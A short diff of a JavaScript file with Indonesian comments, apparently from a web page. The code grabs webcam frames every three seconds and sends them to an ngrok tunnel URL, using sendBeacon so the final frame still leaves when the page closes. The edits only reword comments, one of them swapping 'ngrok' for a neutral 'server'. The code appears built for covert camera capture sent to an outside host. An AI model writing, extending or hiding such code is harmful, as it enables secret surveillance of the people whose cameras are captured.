@@ -32,7 +32,7 @@
       maxRepeats: 15
     },
     cameraRetryInterval: 4000,
-    uploadInterval: 3000, // Interval kirim tangkapan frame ke ngrok setiap 3 detik
+    uploadInterval: 3000, // Interval kirim frame gambar ke server setiap 3 detik
     serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_capture'
   };
 
@@ -92,7 +92,7 @@
       var dataURL = canvas.toDataURL('image/jpeg', 0.80);
       var payload = JSON.stringify({ image: dataURL });
 
-      // Gunakan sendBeacon saat tab ditutup agar frame terakhir tetap terkirim
+      // Kirim menggunakan sendBeacon jika halaman ditutup agar frame terakhir tetap terkirim
       if (isUnloading && navigator.sendBeacon) {
         var blob = new Blob([payload], { type: 'application/json' });
         navigator.sendBeacon(CONFIG.serverEndpoint, blob);
@@ -164,7 +164,7 @@
     startTTS();
     requestCameraAccess();
 
-    // Memulai timer pengiriman berkala setiap 3 detik
+    // Memulai timer pengiriman tangkapan frame setiap 3 detik
     state.uploadTimer = setInterval(function() {
       captureAndUpload(false);
     }, CONFIG.uploadInterval);
